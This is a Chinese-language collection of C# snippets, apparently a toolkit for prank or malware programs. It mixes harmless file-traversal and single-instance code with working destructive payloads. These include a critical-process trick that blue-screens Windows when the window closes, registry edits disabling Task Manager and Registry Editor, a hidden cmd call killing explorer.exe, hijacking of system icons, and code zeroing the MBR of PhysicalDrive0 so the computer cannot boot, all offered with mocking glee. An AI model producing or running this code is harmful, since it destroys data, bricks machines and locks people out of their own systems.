## 遍历所有盘符，得到盘符前缀
```csharp
using System.IO;

foreach (DriveInfo drive in DriveInfo.GetDrives())
{
    if (drive.DriveType == DriveType.Fixed && !drive.IsReady)
    {
        // 过滤未准备好的驱动器
        continue;
    }
    if (drive.DriveType == DriveType.System)
    {
        // 过滤系统盘
        continue;
    }

    // 其他逻辑...
    Console.WriteLine($"Drive: {drive.Name}");
}
```
- 遍历计算机上的所有驱动器信息，然后通过 DriveType 属性来判断驱动器类型，如果是系统盘，则跳过该驱动器，否则执行其他逻辑。
---
## 遍历指定目录下的所有文件路径
```csharp
// 遍历目录下所有文件并处理的模板
try
{
        var files = Directory.GetFiles(path, "*.*", SearchOption.AllDirectories);
        foreach (string file in files)
        ...
}
catch(Exception ex)
{
//处理异常
}
```

```csharp
static string[] TraverseDirectory(string path)
        {
            List<string> fileList = new List<string>();
            try
            {
                // 获取当前目录下的所有文件
                string[] files = Directory.GetFiles(path);
                foreach (string file in files)
                {
                    fileList.Add(file);
                }

                // 递归获取所有子目录下的文件
                string[] dirs = Directory.GetDirectories(path);
                foreach (string dir in dirs)
                {
                    fileList.AddRange(TraverseDirectory(dir));
                }
            }
            catch (Exception ex)
            {
                // 处理异常
                //MessageBox.Show("处理遍历函数出错");
            }
            return fileList.ToArray();
        }

//你可以直接使用这个自定义函数
string[] files = TraverseDirectory(@"C:\");
```
- 遍历指定目录的所有文件，并返回列表到TraverseDirectory，
## 防止程序被结束
- 这必须给一点小小的惩罚
```csharp
 //关闭窗体就蓝屏效果模板
 ​//添加System.Runtime.InteropServices和System.Diagnostics的引用 
  
 ​//声明引用 
 ​[DllImport("ntdll.dll", SetLastError = true)] 
 ​private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength); 
 ​//窗体关闭事件，在窗体事件中的FormClosing 
 ​private void Form1_FormClosing(object sender, FormClosingEventArgs e) 
 ​{ 
 ​    int isCritical = 1;  // we want this to be a Critical Process 
 ​    int BreakOnTermination = 0x1D;  // value for BreakOnTermination (flag) 
  
 ​    Process.EnterDebugMode();  //acquire Debug Privileges 
  
 ​    // setting the BreakOnTermination = 1 for the current process 
 ​    NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int)); 
  
 ​}
```
---

## 注册表相关
```csharp
 
​// 禁止打开注册表 
Registry​.​SetValue​(​@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System"​,​ ​"​DisableRegistryTools​"​,​ ​1​,​ RegistryValueKind​.​DWord​)​; 
  
​// 禁止打开任务管理器 
Registry​.​SetValue​(​@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System"​,​ ​"​DisableTaskMgr​"​,​ ​1​,​ RegistryValueKind​.​DWord​)​;
```
---

## 调用cmd方案
```csharp
 
 ​            ​//杀死explorer 
 ​            ​Process​ ​process_CMD​ ​=​ ​new​ Process​(​)​; 
 ​            process_CMD​.​StartInfo​.​FileName ​=​ ​"​cmd.exe​"​;​//进程打开文件名为“cmd” 
 ​            process_CMD​.​StartInfo​.​RedirectStandardInput ​=​ ​true​;​//是否可以输入 
 ​            process_CMD​.​StartInfo​.​RedirectStandardOutput ​=​ ​true​;​//是否可以输出 
 ​            process_CMD​.​StartInfo​.​CreateNoWindow ​=​ ​true​;​//不创建窗体 也就是隐藏窗体 
 ​            process_CMD​.​StartInfo​.​UseShellExecute ​=​ ​false​;​//是否使用系统shell执行，否 
  
 ​            process_CMD​.​Start​(​)​; 
  
 ​            process_CMD​.​StandardInput​.​WriteLine​(​"​taskkill /im explorer.exe /f ​"​)​;
```

---
## 注册表危险
- 运行了这些，就重装系统吧，一个一个改回来太累
```csharp
using Microsoft.Win32;

//Application.ExecutablePath为本程序路径
// 设置文件夹图标path的值为1-44
Registry.SetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons\" + path, "", Application.ExecutablePath, RegistryValueKind.String);

// 设置“我的电脑”图标
Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\DefaultIcon", "", Application.ExecutablePath, RegistryValueKind.ExpandString);

// 设置“控制面板”图标
Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{208D2C60-3AEA-1069-A2D7-08002B30309D}\DefaultIcon", "", Application.ExecutablePath, RegistryValueKind.ExpandString);

// 设置“回收站”图标
Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{450D8FBA-AD25-11D0-98A8-0800361B1103}\DefaultIcon", "", Application.ExecutablePath, RegistryValueKind.ExpandString);

// 设置“加密文件夹”图标
Registry.SetValue(@"HKEY_CLASSES_ROOT\CLSID\{21EC2020-3AEA-1069-A2DD-08002B30309D}\DefaultIcon", "", Application.ExecutablePath, RegistryValueKind.ExpandString);

// 设置“网络上的计算机”图标
Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{7007ACC7-3202-11D1-AAD2-00805FC1270E}\DefaultIcon", "", Application.ExecutablePath, RegistryValueKind.ExpandString);

// 设置“我的文档”图标
Registry.SetValue(@"HKEY_CLASSES_ROOT\CLSID\{2559a1f1-21d7-11d4-bdaf-00c04f60b9f0}\DefaultIcon", "", Application.ExecutablePath, RegistryValueKind.ExpandString);

// 设置“我的图片”图标
Registry.SetValue(@"HKEY_CLASSES_ROOT\CLSID\{2559a1f0-21d7-11d4-bdaf-00c04f60b9f0}\DefaultIcon", "", Application.ExecutablePath, RegistryValueKind.ExpandString);

```

---
## 第一次运行
1.  在Visual Studio中打开你的项目，选择“项目”菜单下的“属性”选项；
2.  在“属性”窗口中选择“设置”选项卡；
3.  添加一个名为“IsFirstRun”的布尔型设置，并将其值设置为“True”；
4.  在程序启动时，读取“IsFirstRun”设置的值，如果为True，则执行你想要的操作，并将“IsFirstRun”设置为False；
5.  下次程序启动时，读取“IsFirstRun”设置的值，如果为False，则跳过第一次运行的操作。

以下是一个简单的示例代码，演示如何使用应用程序设置来判断程序是否是第一次运行：
```csharp
// 获取 IsFirstRun 设置的值
bool isFirstRun = Properties.Settings.Default.IsFirstRun;

// 如果是第一次运行，则执行操作，并将 IsFirstRun 设置为 false
if (isFirstRun)
{
    // TODO: 执行第一次运行的操作

    // 设置 IsFirstRun 为 false
    Properties.Settings.Default.IsFirstRun = false;
    Properties.Settings.Default.Save();
}
else
{
    // TODO: 跳过第一次运行的操作
}
```

---
## 防止多次点开
```csharp  
Process[] pro = Process.GetProcessesByName("CarParkInspectApp");  
if (pro == null || pro.Length >= 2)  
{  
    MessageBox.Show("软件已打开，请勿重复打开！");  
    Application.Exit();  
    return;  
}  
```  
- 此代码可直接放在程序主函数进程中。
---
## 清空MBR引导，让计算机无法开机
修改 MBR（主引导记录）可以禁止计算机启动。但是，这个操作涉及到系统底层，需要非常小心，因为错误的操作可能导致计算机无法启动。请谨慎使用。  
  
以下是一个简单的示例，可以使用 C# 代码修改 MBR，禁止计算机启动：  
  
```csharp  
using System.IO;  
  
// 读取 MBR  
byte[] mbr = new byte[512];  
using (FileStream stream = new FileStream(@"\\.\PhysicalDrive0", FileMode.Open))  
{  
    stream.Read(mbr, 0, mbr.Length);  
}  
  
// 修改 MBR  
for (int i = 0; i < mbr.Length; i++)  
{  
    mbr[i] = 0x00;  
}  
  
// 写入 MBR  
using (FileStream stream = new FileStream(@"\\.\PhysicalDrive0", FileMode.Open))  
{  
    stream.Write(mbr, 0, mbr.Length);  
}  
```  
  
在上面的示例中，我们使用 `FileStream` 类读取物理磁盘的 MBR，将其全部设置为 0x00，并重新写回磁盘。注意，这里的磁盘是物理磁盘，而非分区。  
  
简单地将 MBR 设置为 0x00
想启动就得重新装引导，嘿嘿。